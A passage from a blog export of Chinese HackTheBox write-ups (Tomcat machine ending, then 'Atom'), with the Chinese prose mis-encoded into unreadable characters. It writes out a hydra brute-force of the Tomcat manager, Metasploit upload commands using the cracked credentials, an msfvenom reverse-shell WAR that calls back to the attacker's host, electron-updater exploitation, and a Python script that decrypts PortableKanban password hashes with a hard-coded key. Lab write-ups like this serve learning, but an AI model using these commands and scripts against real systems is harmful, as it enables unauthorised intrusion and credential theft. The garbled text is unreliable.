<p>æˆ‘ä»¬ç«‹é©¬ç™»å½•tomcaté¡µé¢ï¼Œå¹¶ä¸”å°è¯•è´¦æˆ·å’Œå¯†ç éƒ½æ˜¯adminï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç™»å½•æˆåŠŸï¼Œç»“æœæ˜¯å¤±è´¥çš„ã€‚<br><img src="https://img-blog.csdnimg.cn/14569a31b1e04d76855654582e15e833.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/a1c59a404d30477d9434d5ca81214227.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬ä¸‹è½½<code>seclists</code>è¿™ä¸ªå·¥å…·ï¼Œå¯¹tomcatçš„é»˜è®¤ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæš´åŠ›ç ´è§£<br><img src="https://img-blog.csdnimg.cn/4573275f27314e41997be90a187c528b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬ä½¿ç”¨hydraå·¥å…·å¯¹è´¦å·å¯†ç è¿›è¡Œç ´è§£ï¼Œå‘ç°è´¦å·æ˜¯tomcatï¼Œå¯†ç æ˜¯s3cret</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http://10.10.10.95:8080/manager/html</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2e489a5e1395436f87bbc2c1c05db04b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h3 id="MSFè·å–æƒé™"><a href="#MSFè·å–æƒé™" class="headerlink" title="MSFè·å–æƒé™"></a>MSFè·å–æƒé™</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search tomcat_mgr</span><br><span class="line">use exploit/multi/http/tomcat_upload</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.10.95</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.14.11</span><br><span class="line"><span class="built_in">set</span> httpusername tomcat</span><br><span class="line"><span class="built_in">set</span> httppassword s3cret</span><br><span class="line"><span class="built_in">set</span> rport 8080</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/405b1654a30e4fd8b5ff405938d24a51.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è·å–ä¸€ä¸ªshellï¼Œå‘ç°å·²ç»æ˜¯æœ€é«˜æƒé™äº†<br><img src="https://img-blog.csdnimg.cn/efd9843d30e5431cbe6ae1408fbcb011.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŸ¥çœ‹åˆ°flagå€¼äº†<br><img src="https://img-blog.csdnimg.cn/89ecac8618f24fdf9edd6cf96a419036.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h3 id="NCåå¼¹shell"><a href="#NCåå¼¹shell" class="headerlink" title="NCåå¼¹shell"></a>NCåå¼¹shell</h3><p>é¦–å…ˆæˆ‘ä»¬å…ˆå‡†å¤‡ä¸€ä¸ªæœ¨é©¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.11 lport=1234 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/c4abdde92c484b46ac8782a2c62da4fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨è´¦å·å¯†ç ç™»å½•è¿›éƒ¨ç½²é¡µé¢ï¼Œå¹¶å°†ç”Ÿæˆçš„æœ¨é©¬éƒ¨ç½²è¿›tomcatæœåŠ¡å™¨ä¸Š<br><img src="https://img-blog.csdnimg.cn/9dd05049c33f45cf971a5f70a9a6d2e8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬å¯åŠ¨ncè¿›è¡Œç›‘å¬ï¼Œå¹¶ä¸”åœ¨æµè§ˆå™¨ä¸Šæµè§ˆæˆ‘ä»¬åˆšåˆšä¸Šä¼ çš„waråŒ…ï¼Œåå¼¹shellæˆåŠŸã€‚<br><img src="https://img-blog.csdnimg.cn/fbcd897e89c149549ead8a54352163ae.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/488c679d14e64be28972f71dab63504a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>ä¸­é—´ä»¶</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Atom</title>
    <url>/2021/12/24/Atom/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/d7ff3a26ad1b4b0680f0d4283d757a77.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å¯ä»¥çœ‹åˆ°é¶æœºå¼€æ”¾äº†80ç«¯å£ï¼Œé‚£è¯æ˜å°±å­˜åœ¨webæœåŠ¡ã€‚<br><img src="https://img-blog.csdnimg.cn/71d80ba7cc3748c4a4f0402a9793083a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/458004df73e046d6ac29665f942ae2a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>å¾€ä¸‹çœ‹çš„æ—¶å€™ï¼Œå‘ç°guestç”¨æˆ·å¯ä»¥ç™»å½•smbæœåŠ¡ï¼Œé‚£æˆ‘ä»¬å°±å…ˆçœ‹çœ‹smbæœåŠ¡é‡Œè¾¹éƒ½æœ‰å“ªäº›æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚<br><img src="https://img-blog.csdnimg.cn/35ce3f11c2ea4febac8767c3761d9f0f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨åŒ¿åç™»å½•çœ‹çœ‹å¯ä»¥è®¿é—®åˆ°å“ªäº›ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°å…·æœ‰è¯»å†™æƒé™çš„ç›®å½•åªæœ‰<code>Software_Updates</code>è¿™ä¸ªç›®å½•<br><img src="https://img-blog.csdnimg.cn/901c2bdb6d4d4e7da7675e1c24ee1e36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ç™»å½•è¿›è¿™ä¸ªç›®å½•ä¸­ï¼Œæœ‰ä¸€ä¸ªpdfæ–‡ä»¶å¯ä»¥ä¸‹è½½ï¼Œæˆ‘ä»¬ä¸‹è½½æŸ¥çœ‹äº†ä¸‹é‡Œé¢çš„å†…å®¹ã€‚<br><img src="https://img-blog.csdnimg.cn/2ecb65835531481289d535ee549568a4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/1edacfc8f7844517bae4f0e7dbd97af0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æŸ¥çœ‹å®Œè¿™äº›ä¿¡æ¯åï¼Œæˆ‘ä»¬ç»§ç»­è®¿é—®webæœåŠ¡ã€‚åœ¨æœåŠ¡çš„åº•ç«¯å­˜åœ¨ä¸€ä¸ªé‚®ç®±è´¦å·å’ŒåŸŸåï¼Œæˆ‘ä»¬å…ˆæ·»åŠ åˆ°hostsæ–‡ä»¶ä¸­ï¼Œä¾¿äºåé¢è¿›è¡Œç›®å½•çˆ†ç ´å’Œå­åŸŸåçš„æœé›†ã€‚<br><img src="https://img-blog.csdnimg.cn/35cf8a81609b4187930f03c62fcf602d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬å°±ä½¿ç”¨<code>gobuster</code>è¿›è¡ŒåŸŸåå’Œç›®å½•çš„çˆ†ç ´å§<br><img src="https://img-blog.csdnimg.cn/916619d4e1dc4bfba3e44627be4f0f36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/b59b2cb6beb94f13bd94e36d031e5dba.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œå“ï¼è¿˜æ˜¯è€è€å®å®å»ä¸‹è½½è½¯ä»¶å§ã€‚ã€‚ã€‚<br><img src="https://img-blog.csdnimg.cn/cc46996341604dffb098519776c2cfc8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°æ˜¯ä¸ªexeç¨‹åºï¼Œé‚£æˆ‘ä»¬æŠŠå®ƒä¸¢Windowsä¸Šè¿è¡Œçœ‹çœ‹æ•ˆæœæ˜¯æ€ä¹ˆæ ·çš„<br><img src="https://img-blog.csdnimg.cn/aea7a78db0594a95b20e01811fc600ae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨ymlæ–‡ä»¶ä¸­å‘ç°äº†è¿™æ˜¯ä¸€ä¸ªç”µå­åº”ç”¨ç¨‹åº<br><img src="https://img-blog.csdnimg.cn/1447b123093e4cf79c5fbdf992c90238.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æ ¹æ®æœç´¢åˆ°çš„ä¿¡æ¯ï¼Œä¸Šè°·æ­Œè¿›è¡Œæœç´¢ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä½å¤§ä½¬å‘ç°äº†è¿™ä¸ªæ¼æ´<br><img src="https://img-blog.csdnimg.cn/d4b8f3b4ba784683918c21291c351027.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/3576872644644aef95d67125deffcd4f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¤§ä½¬å·²ç»ç»™å‡ºäº†æ¼æ´åˆ©ç”¨çš„æ–¹æ³•ï¼Œé¦–å…ˆå…ˆä½¿ç”¨åŒ…å«å•å¼•å·çš„æ–‡ä»¶åï¼Œç„¶åé‡æ–°è®¡ç®—æ–‡ä»¶å“ˆå¸Œä»¥åŒ¹é…æ”»å‡»è€…æä¾›çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚<br><img src="https://img-blog.csdnimg.cn/2ce2ad37d7314f4781ca47e3372b791c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>é¦–å…ˆæˆ‘ä»¬å…ˆç”Ÿæˆä¸€ä¸ªå¸¦æœ‰å•å¼•å·çš„æœ‰æ•ˆè½½è·<br><img src="https://img-blog.csdnimg.cn/841300482268465f928a7a1c6029c243.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬æŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•ï¼Œç”Ÿæˆä¸€ä¸ª sha512 sum hash å¹¶å°†å…¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œç„¶åè¿›ä¸€æ­¥è½¬æ¢ä¸ºbase64<br><img src="https://img-blog.csdnimg.cn/5222e5c555ae452499acff13d2f7999a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬æ–°å»ºlatest.ymlè¿™ä¸ªæ–‡ä»¶ï¼Œå°†ä¸Šé¢ç”Ÿæˆçš„å€¼è¿›è¡Œå¤åˆ¶ç²˜è´´<br><img src="https://img-blog.csdnimg.cn/d5c11c4ee72b45f09ef3842b265aec6b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç´§æ¥ç€æˆ‘ä»¬ä½¿ç”¨pythonå¼€å¯ä¸€ä¸ªæœåŠ¡å™¨<br><img src="https://img-blog.csdnimg.cn/6a8bfdbfe08e4dbaad426ef2204b19f0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸‰ä¸ªæ–‡ä»¶å¤¹éƒ½è¦æ›¿æ¢æ‰ymlæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/51201bef231a46a9a2b2221c45ffeb40.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/99de167220ab45808c982e771e32f731.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬åœ¨msfä¸Šå¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œè®¾ç½®å¥½åŸºæœ¬å‚æ•°åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åå¼¹çš„shell<br><img src="https://img-blog.csdnimg.cn/8cd39b8f18d34046a6a3a1abd41d1bd4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/2ffa34dc528d4bffbf22bbff28573e83.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å½“å‰ç”¨æˆ·çš„æƒé™</p>
<p><img src="https://img-blog.csdnimg.cn/46fc63e01a074f8780b9977a64491034.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥cmdç»ˆç«¯è¿›è¡Œæ“ä½œ<br><img src="https://img-blog.csdnimg.cn/572df466d9dd4791a92d255ca60aa7a7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥<code>Program Files</code>è¿™ä¸ªç›®å½•æŸ¥çœ‹ä¸»æœºéƒ½å®‰è£…äº†å“ªäº›åº”ç”¨ç¨‹åºã€‚å¯ä»¥çœ‹åˆ°å®‰è£…äº†Redisæ•°æ®åº“ï¼Œæ˜¯ä¸æ˜¯æƒ³è¯•è¯•æœªæˆæƒè®¿é—®ï¼Ÿè¿™æ˜¯ç›´è§‰å“ˆå“ˆ<br><img src="https://img-blog.csdnimg.cn/9a3ff33f781548e7be38f9fbb77d972b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å…ˆè¿›å…¥è¿™ä¸ªç›®å½•ï¼Œçœ‹çœ‹é…ç½®æ–‡ä»¶æ˜¯å¦éœ€è¦å¯†ç è¿›è¡Œç™»å½•çš„ã€‚æˆ‘ä»¬æŸ¥æ‰¾<code>redis.windows-service.conf</code>è¿™ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤<code>type redis.windows-service.conf | findstr requirepass</code>å¿«é€ŸæŸ¥æ‰¾åˆ°ç™»å½•æ•°æ®åº“çš„å¯†ç <br><img src="https://img-blog.csdnimg.cn/bb3958f354d14907842c4a54f90141be.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ—¢ç„¶å‘ç°äº†å¯†ç ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å°è¯•å¯ä¸å¯ä»¥ç™»å½•æˆåŠŸå§<br><img src="https://img-blog.csdnimg.cn/73ef19ef23b04f979996089529a2ec3b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åˆ—å‡ºæ‰€æœ‰çš„hashçœ‹çœ‹ï¼Œå‘ç°äº†ä¸€ä¸ªæ¯”è¾ƒæœ‰ä»·å€¼çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/21d54e0c5d914c8ea4288315af18521b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹userå¯¹åº”çš„ä¿¡æ¯ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç®¡ç†å‘˜ï¼Œå¹¶ä¸”è¿˜æŒ–æ˜åˆ°äº†ä»–å¯¹åº”çš„hashå€¼<code>Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi</code><br><img src="https://img-blog.csdnimg.cn/3bf1bf2cbfb6417c9058a3d05d874987.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ—¢ç„¶æ¶‰åŠåˆ°ç”¨æˆ·ä¿¡æ¯ï¼Œé‚£æˆ‘ä»¬å°±å»Usersç›®å½•ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯å§ã€‚ç„¶è€Œåœ¨jasonçš„æ¡Œé¢ä¸Šï¼Œæˆ‘ä»¬çœ‹åˆ°äº†user.txtæ–‡ä»¶ï¼Œæ‹¿åˆ°ç¬¬ä¸€ä¸ªflagå€¼<img src="https://img-blog.csdnimg.cn/806ca1c22ee14f7fa5bb5688113ff486.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="t"><br>åœ¨jasonçš„ä¸»æœºä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†ä»–å®‰è£…äº†ä¸¤ä¸ªåº”ç”¨ç¨‹åºï¼Œä¸€ä¸ªæ˜¯<code>node_modules</code>å’Œ<code>PortableKanban</code><br><img src="https://img-blog.csdnimg.cn/171f022c449c4fdda60d7e6c67bca7a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/1bc9495245b24508b8408bee3570a7e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹cfgé…ç½®æ–‡ä»¶ï¼Œå‘ç°äº†å¯¹åº”çš„hashå€¼<code>Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb</code><br><img src="https://img-blog.csdnimg.cn/96ad43ed232e4c928dfb0b255cf0b550.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬åœ¨exploit-dbä¸­æœç´¢åˆ°å¯¹åº”çš„æ¼æ´åˆ©ç”¨ä»£ç <br><img src="https://img-blog.csdnimg.cn/c205078ffcc14aff81bba88d60aa34ad.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯¹è¿™ä¸ªåˆ©ç”¨è„šæœ¬è¿›è¡Œç®€æ´ï¼Œè®©å®ƒç›´æ¥è¾“å‡ºå¯¹åº”çš„æ˜æ–‡å€¼ã€‚å¾—åˆ°æ˜æ–‡å€¼<code>kidvscat_yes_kidvscat</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment">#python3 -m pip install des</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">        <span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&#x27;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/938feaacbc2d46888b987f570b3a166f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç™»å½•æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/020f2b5f8b624d2b9420511bc70c6941.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>SMB</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
</search>
